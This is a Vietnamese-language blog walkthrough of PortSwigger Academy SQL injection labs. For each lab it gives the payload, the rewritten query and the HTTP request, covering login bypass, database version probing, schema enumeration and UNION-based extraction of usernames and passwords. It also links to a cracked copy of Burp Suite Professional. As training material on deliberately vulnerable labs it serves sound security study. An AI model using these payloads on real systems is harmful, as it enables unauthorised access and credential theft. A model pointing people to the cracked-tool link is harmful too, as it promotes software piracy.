---
title: "[PortSwigger Lab] - Sql Injection"
description: The first post
date: 2025-05-21 22:00:00 +0700
categories: [Cyber ​​Security, Web Pentest]
tags: [portswigger, burpsuite, labs, web, vulnerability]   
pin: false
comments: true
image:
    path: https://raw.githubusercontent.com/waibui/blog-assets/refs/heads/main/imgs/posts/2025-05-21-portswigger-lab-sql-injection/sql_injection.png
    alt: Sql Injection
---

## Introduction
---
### What is SQL Injection(SQLi)? 
SQL Injection (SQLi) là một dạng tấn công bảo mật trong đó kẻ tấn công chèn (inject) mã SQL độc hại vào một truy vấn cơ sở dữ liệu thông qua các đầu vào không được kiểm soát (chẳng hạn như form đăng nhập, URL, cookie...). Mục tiêu là can thiệp vào truy vấn SQL gốc mà ứng dụng web thực hiện, từ đó có thể:
- Xem dữ liệu mà bình thường không được phép truy cập (vd: thông tin người dùng, mật khẩu đã mã hóa).
- Thay đổi dữ liệu (vd: cập nhật thông tin người dùng, xóa dữ liệu).
- Thực thi các lệnh quản trị cơ sở dữ liệu (vd: DROP TABLE).
- Trong trường hợp nặng hơn, có thể chiếm quyền điều khiển server.

### Type of SQL Injection(SQLi)?

| Type                  | Description                                                                                   |
|-----------------------|-----------------------------------------------------------------------------------------------|
| **Classic (In-band)** | Kẻ tấn công thấy ngay kết quả của truy vấn bị chèn SQL, thường dùng `' OR '1'='1` để bypass.  |
| **Tautology-based**   | Chèn biểu thức luôn đúng vào câu lệnh WHERE để qua mặt kiểm tra xác thực. Ví dụ: `admin' --` |
| **Union-based**       | Dùng `UNION` để nối thêm kết quả từ truy vấn khác, thường để đọc dữ liệu bảng nhạy cảm.       |
| **Boolean-based Blind** | Dựa vào phản hồi đúng/sai từ server để suy đoán thông tin. Ví dụ: `' AND 1=1 --`            |
| **Time-based Blind**  | Sử dụng hàm gây trễ như `SLEEP()` để xác định kết quả thông qua thời gian phản hồi.          |
| **Error-based**       | Khai thác lỗi trả về để lấy thông tin cấu trúc cơ sở dữ liệu.                                 |
| **Out-of-Band (OOB)** | Không nhận phản hồi trực tiếp, thay vào đó gửi dữ liệu ra ngoài (DNS, HTTP).                 |
| **Stacked Queries**   | Chạy nhiều truy vấn trong một lần, ví dụ: `1'; DROP TABLE users --`                           |
| **Second-order**      | Dữ liệu độc hại được lưu vào DB và thực thi sau ở một vị trí khác trong ứng dụng.            |


## Solve SQL Injection Labs
[Cheat Sheat](https://portswigger.net/web-security/sql-injection/cheat-sheet)

[Burpsuite Professional Crack](https://github.com/xiv3r/Burpsuite-Professional)

---
### Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
> Mục tiêu: Thực hiện một cuộc tấn công tiêm SQL khiến ứng dụng hiển thị một hoặc nhiều sản phẩm chưa phát hành.

Phòng thí nghiệm này chứa lỗ hổng SQL trong bộ lọc danh mục sản phẩm, khi người dùng chọn một danh mục, ứng dụng sẽ thực hiện truy vấn SQL như sau:
```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

Payload:
```
' OR 1=1 --
```

Câu truy vấn sẽ được thay thế thành:
```sql
SELECT * FROM products WHERE category = '' OR 1=1 --' AND released = 1
```

Request:

```http
GET /filter?category='+OR+1%3d1+-- HTTP/2
Host: 0aa400cc04b07ef3818389f900dd00df.web-security-academy.net
```

### Lab: SQL injection vulnerability allowing login bypass
> Mục tiêu: Thực hiện một cuộc tấn công tiêm SQL đăng nhập vào ứng dụng với tư cách là `administrator`.

Phòng thí nghiệm này chứa lỗ hổng tiêm SQL trong chức năng đăng nhập, ứng dụng sẽ thực hiện truy vấn SQL như sau:

```sql
SELECT * FROM users WHERE username = 'usenname' AND password = 'password'
```

Payload:
```
administrator'--
```

Câu truy vấn sẽ được thay thế thành:
```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = 'password'
```

Request:

```http
POST /login HTTP/2
Host: 0aca001104f9e33981f77a9d001f003c.web-security-academy.net

csrf=FeKN7j0LMwFrA9s7ph9bXzk0ZcoxiAIZ&username=administrator%27+--&password=abc
```

### Lab: SQL injection attack, querying the database type and version on Oracle
> Mục tiêu: Hiển thị version của `database`.

Phòng thí nghiệm này chứa lỗ hổng SQL trong bộ lọc danh mục sản phẩm, khi người dùng chọn một danh mục, ứng dụng sẽ thực hiện truy vấn SQL như sau:
```sql
SELECT field1, field2, ..., fieldn FROM products WHERE category = 'category_name' ...
```

#### Specify the number of columns
Trên cơ sở dữ liệu **Oracle**, mỗi câu lệnh **SELECT** bắt buộc phải có mệnh đề **FROM**, tức là phải lấy dữ liệu từ một bảng nào đó. Điều này khác với một số hệ quản trị cơ sở dữ liệu khác như **MySQL**, nơi bạn có thể viết:
```sql
SELECT 'abc';
```

Trong **Oracle**, cần sử dụng bảng dual để truy vấn không bị lỗi.

Payload:
```
' UNION SELECT 'abc', 'def' from dual--
```

Câu truy vấn sẽ được thay thế thành:
```sql
SELECT field1, field2, ..., fieldn FROM products WHERE category = '' UNION SELECT 'abc', 'def' from dual--' ...
```

Nếu không trả về lỗi tức **SELECT** đầu tiên chỉ có 2 trường field1 và field2. Vì khi sử dụng **UNION** thì số trường của nó phải tương ứng với số trường của **SELECT** đầu tiên.

Request:

```http
GET /filter?category='+UNION+SELECT+'abc',+'def'+FROM+dual-- HTTP/2
Host: 0aa100c804bdaaca80461cd000ac0034.web-security-academy.net
```

#### Determine the Database Version
Payload:
```
' UNION SELECT 'abc', banner from v$version--
```

Câu truy vấn sẽ được thay thế thành:
```sql
SELECT field1, field2 FROM products WHERE category = '' UNION SELECT 'abc', banner from v$version--' ...
```

Request:

```http
GET /filter?category='+UNION+SELECT+'abc',+banner+FROM+v$version-- HTTP/2
Host: 0aa100c804bdaaca80461cd000ac0034.web-security-academy.net
```

Result:
![Oracle DB Version](https://raw.githubusercontent.com/waibui/blog-assets/refs/heads/main/imgs/posts/2025-05-21-portswigger-lab-sql-injection/query_oracle_version.png)


### Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
> Mục tiêu: Hiển thị version của `database`.

Phòng thí nghiệm này chứa lỗ hổng SQL trong bộ lọc danh mục sản phẩm, khi người dùng chọn một danh mục, ứng dụng sẽ thực hiện truy vấn SQL như sau:
```sql
SELECT field1, field2, ..., fieldn FROM products WHERE category = 'category_name' ...
```

#### Specify the number of columns
Cũng như lab vừa rỗi nhưng **MySQL** và **Microsoft** không cần **FROM** cho **SELECT**, không sử dụng được comment `--` tại lab này, mà phải sử dụng `#`.

Payload:
```
' UNION SELECT 'abc', 'def'#
```

Câu truy vấn sẽ được thay thế thành:
```sql
SELECT field1, field2, ..., fieldn FROM products WHERE category = '' UNION SELECT 'abc', 'def'#' ...
```

Request:

```http
GET /filter?category='+UNION+SELECT+'abc','def'%23 HTTP/2
Host: 0a31003a04f410a880ac87d8001a0088.web-security-academy.net
```

#### Determine the Database Version
**MySQL** và **Microsoft** sử dụng chung lệnh `SELECT @@version` để lấy **Version**.

Payload:
```sql
' UNION SELECT 'abc', @@version#
```

Câu truy vấn sẽ được thay thế thành:
```sql
SELECT field1, field2 fieldn FROM products WHERE category = '' UNION SELECT 'abc', @@version#' ...
```

Request:

```http
GET /filter?category='+UNION+SELECT+'abc',@@version%23 HTTP/2
Host: 0a31003a04f410a880ac87d8001a0088.web-security-academy.net
```

Result:

![MySQL and Microsolf Version](https://raw.githubusercontent.com/waibui/blog-assets/refs/heads/main/imgs/posts/2025-05-21-portswigger-lab-sql-injection/query_msql_microsoft_version.png)

### Lab: SQL injection attack, listing the database contents on non-Oracle databases
> Mục tiêu: Đăng nhập với vai trò `administrator`.

Phòng thí nghiệm này chứa lỗ hổng SQL trong bộ lọc danh mục sản phẩm, khi người dùng chọn một danh mục, ứng dụng sẽ thực hiện truy vấn SQL như sau:
```sql
SELECT field1, field2, ..., fieldn FROM products WHERE category = 'category_name' ...
```

Ứng dụng có chức năng đăng nhập và cơ sở dữ liệu chứa một bảng lưu trữ tên người dùng và mật khẩu. Bạn cần xác định tên của bảng này và các cột mà nó chứa, sau đó truy xuất nội dung của bảng để lấy tên người dùng và mật khẩu của tất cả người dùng.

#### Specify the number of columns
Sử dụng tương tự các cách trên ta được số lượng cột trả về là 2

Payload:
```
' UNION SELECT 'abc', 'def'#
```

Câu truy vấn sẽ được thay thế thành:
```sql
SELECT field1, field2, ..., fieldn FROM products WHERE category = '' UNION SELECT 'abc', 'def'--' ...
```

Request:

```http
GET /filter?category='+UNION+SELECT+'abc','def'-- HTTP/2
Host: 0a31003a04f410a880ac87d8001a0088.web-security-academy.net
```

#### Get all table name
Xác định tên của bảng chứa `username` và `password`
Payload:
```
' UNION SELECT 'abc', table_name FROM information_schema.tables--
```

Câu truy vấn sẽ được thay thế thành:
```sql
SELECT field1, field2 FROM products WHERE category = '' UNION SELECT 'abc', table_name FROM information_schema.tables--' ...
```

Request:

```http
GET /filter?category='+UNION+SELECT+NULL,'table_name'+FROM+information_schema.tables-- HTTP/2
Host: 0a31003a04f410a880ac87d8001a0088.web-security-academy.net
```

#### Get all collumn name
Cần xác định tên của trường chứa `username` và `password` để để lấy thông tin tài khoản `administrator`.

Payload:
```
' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users_bmlccj'--
```

Câu truy vấn sẽ được thay thế thành:
```sql
SELECT field1, field2 FROM products WHERE category = '' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users_bmlccj'--' ...
```

Request:

```http
GET /filter?category='+UNION+SELECT+NULL,column_name+FROM+information_schema.columns+WHERE+table_name='users_bmlccj'-- HTTP/2
Host: 0a31003a04f410a880ac87d8001a0088.web-security-academy.net
```

#### Get administrator's password
Payload:
```
' UNION SELECT username_plivox, password_jffxkk FROM users_bmlccj--
```

Câu truy vấn sẽ được thay thế thành:
```sql
SELECT field1, field2 FROM products WHERE category = '' UNION SELECT username_plivox, password_jffxkk FROM users_bmlccj--' ...
```

Hoàn thành lab bằng cách đăng nhập bằng tài khoản `administrator`.


### Lab: SQL injection attack, listing the database contents on Oracle
> Mục tiêu: Đăng nhập với vai trò `administrator`.

Phòng thí nghiệm này chứa lỗ hổng SQL trong bộ lọc danh mục sản phẩm, khi người dùng chọn một danh mục, ứng dụng sẽ thực hiện truy vấn SQL như sau:
```sql
SELECT field1, field2, ..., fieldn FROM products WHERE category = 'category_name' ...
```

Thực hiện tương tự bài lab trên nhưng sử dụng các cú pháp của **Oracle**.

#### Specify the number of columns
Tương tự nhưng có FROM dual phía sau, ta xác định được 2 cột trả về.

Payload:
```
' UNION SELECT 'abc', 'def' FROM dual--
```

Câu truy vấn sẽ được thay thế thành:
```sql
SELECT field1, field2, ..., fieldn FROM products WHERE category = '' UNION SELECT 'abc', 'def' FROM dual--' ...
```

Request:

```http
GET /filter?category='+UNION+SELECT+'abc','def'+FROM+dual-- HTTP/2
Host: 0a31003a04f410a880ac87d8001a0088.web-security-academy.net
```

#### Get all table name
Xác định tên của bảng chứa `username` và `password`

Payload:
```
' UNION SELECT NULL, table_name FROM all_tables--
```

Câu truy vấn sẽ được thay thế thành:
```sql
SELECT field1, field2 FROM products WHERE category = '' UNION SELECT NULL, table_name FROM all_tables--' ...
```

Request:

```http
GET /filter?category='+UNION+SELECT+NULL,'table_name'+FROM+all_tables-- HTTP/2
Host: 0a31003a04f410a880ac87d8001a0088.web-security-academy.net
```

#### Get all collumn name
Cần xác định tên của trường chứa `username` và `password` để để lấy thông tin tài khoản `administrator`.

Payload:
```
' UNION SELECT NULL,column_name FROM all_tab_columns WHERE table_name='USERS_RNVYLX'--
```

Câu truy vấn sẽ được thay thế thành:
```sql
SELECT field1, field2 FROM products WHERE category = '' UNION SELECT NULL,column_name FROM all_tab_columns WHERE table_name='USERS_RNVYLX'--' ...
```

Request:

```http
GET /filter?category='+UNION+SELECT+NULL,column_name+FROM+all_tab_columns+WHERE+table_name='USERS_RNVYLX'-- HTTP/2
Host: 0a31003a04f410a880ac87d8001a0088.web-security-academy.net
```

#### Get administrator's password
Payload:
```
' UNION SELECT USERNAME_LXRDRN, PASSWORD_ANINSL FROM USERS_RNVYLX--
```

Câu truy vấn sẽ được thay thế thành:
```sql
SELECT field1, field2 FROM products WHERE category = '' UNION SELECT USERNAME_LXRDRN, PASSWORD_ANINSL FROM USERS_RNVYLX--' ...
```

Hoàn thành lab bằng cách đăng nhập bằng tài khoản `administrator`.

### Lab: SQL injection UNION attack, determining the number of columns returned by the query
> Mục tiêu: Tìm số lượng cột trả về.

Phòng thí nghiệm này chứa lỗ hổng SQL trong bộ lọc danh mục sản phẩm, khi người dùng chọn một danh mục, ứng dụng sẽ thực hiện truy vấn SQL như sau:
```sql
SELECT field1, field2, ..., fieldn FROM products WHERE category = 'category_name' ...
```

Payload:
```
' UNION SELECT NULL,NULL,NULL--
```

Tăng hoặc giảm **NULL** để có thể tìm được số lượng cột của **select** ban đầu, vì khi sử dụng **UNION** sau **SELECT** phải đảm bảo số trường phải bằng nhau.

Câu truy vấn sẽ được thay thế thành:
```sql
SELECT field1, field2, field3 FROM products WHERE category = '' UNION SELECT NULL,NULL,NULL--' ...
```

Request:

```http
GET /filter?category='+UNION+SELECT+NULL,NULL,NULL-- HTTP/2
Host: 0ac500110304e078827f2e7e0016009c.web-security-academy.net
```

Nếu server không trả về lỗi là đã thành công!


### Lab: SQL injection UNION attack, finding a column containing text
> Mục tiêu: Tìm số lượng cột và cột nào chứa dữ liệu dạng string.

Phòng thí nghiệm này chứa lỗ hổng SQL trong bộ lọc danh mục sản phẩm, khi người dùng chọn một danh mục, ứng dụng sẽ thực hiện truy vấn SQL như sau:
```sql
SELECT field1, field2, ..., fieldn FROM products WHERE category = 'category_name' ...
```

#### Check number of column
Tương tự như cách làm ở trên

#### Check column contain string
Sau khi xác định được số lượng cột, thay đổi từng **NULL** bằng 1 chuỗi để kiểm tra xem trường đó chứa chuỗi không.

Payload:
```
' UNION SELECT NULL,'abc',NULL--
```

Câu truy vấn sẽ được thay thế thành:
```sql
SELECT field1, field2, field3 FROM products WHERE category = '' UNION SELECT NULL,'abc',NULL--' ...
```

Request:

```http
GET /filter?category='+UNION+SELECT+NULL,'abc',NULL-- HTTP/2
Host: 0aac00f304cd312981790cd700d50010.web-security-academy.net
```

### Lab: SQL injection UNION attack, retrieving data from other tables
> Mục tiêu: đăng nhập với tư cách `administrator`.

Phòng thí nghiệm này chứa lỗ hổng SQL trong bộ lọc danh mục sản phẩm, khi người dùng chọn một danh mục, ứng dụng sẽ thực hiện truy vấn SQL như sau:
```sql
SELECT field1, field2, ..., fieldn FROM products WHERE category = 'category_name' ...
```

Cơ sở dữ liệu chứa một bảng khác được gọi là `users`, với các cột được gọi là `username` và `password`.
Thực hiện một cuộc tấn công **UNION** SQL Injection truy xuất tất cả các `username` và `password` và sử dụng thông tin để đăng nhập với tư cách là `administrator`.

#### Check number of column
Tương tự như cách làm ở trên

#### Check data of **username** and **password** field
Sau khi xác định được số cột, sử dụng **UNION** để hiển thị dât của `username` và `password`. Lấy thông tin đăng nhập của `administrator` và đăng nhập.

Payload:
```
' UNION SELECT username,password FROM users--
```

Câu truy vấn sẽ được thay thế thành:
```sql
SELECT field1, field2 FROM products WHERE category = '' UNION SELECT username,password FROM users--' ...
```

Request:

```http
GET /filter?category='+UNION+SELECT+username,password+FROM+users-- HTTP/2
Host: 0a5000b204d472c880cdd01700d80031.web-security-academy.net
```

### Lab: SQL injection UNION attack, retrieving multiple values in a single column
> Mục tiêu: đăng nhập với tư cách `administrator`.

Phòng thí nghiệm này chứa lỗ hổng SQL trong bộ lọc danh mục sản phẩm, khi người dùng chọn một danh mục, ứng dụng sẽ thực hiện truy vấn SQL như sau:
```sql
SELECT field1, field2, ..., fieldn FROM products WHERE category = 'category_name' ...
```
Cơ sở dữ liệu chứa một bảng khác được gọi là `users`, với các cột được gọi là `username` và `password`.
Thực hiện một cuộc tấn công **UNION** SQL Injection truy xuất tất cả các `username` và `password` và sử dụng thông tin để đăng nhập với tư cách là `administrator`.

#### Check number of column && Check column contain string
Cũng thự hiện tương tự 2 lab trên, nhưng ở đây chỉ có 1 trường chứa kiểu `string`. Vì thế chỉ có thể hiển thị nội dung của 1 trương `username` hoặc `password`.
> Ý tưởng: Gộp `username` và `password` vào chung 1 trường.

Payload:
```
' UNION SELECT NULL,CONCAT(username,||,password) FROM users--
```

Ta sử dụng hàm **CONCAT()** để gộp nội dung các cột lại với nhau. Nối `username` và `password`, dùng `||` để tách biệt nó ra cho dễ quan sát, dữ liệu hiển thị ở dạng `wiener||wiener_password`

Câu truy vấn sẽ được thay thế thành:
```sql
SELECT field1, field2 FROM products WHERE category = '' UNION SELECT NULL,CONCAT(username,||,password) FROM users--' ...
```

Request:

```http
GET /filter?category='+UNION+SELECT+NULL,CONCAT(username,'||',password)+FROM+users-- HTTP/2
Host: 0a1400560347179d818bacde006400a6.web-security-academy.net
```

Lấy thông tin đăng nhập của `administrator` và đăng nhập.

### 


---
Goodluck! 🍀🍀🍀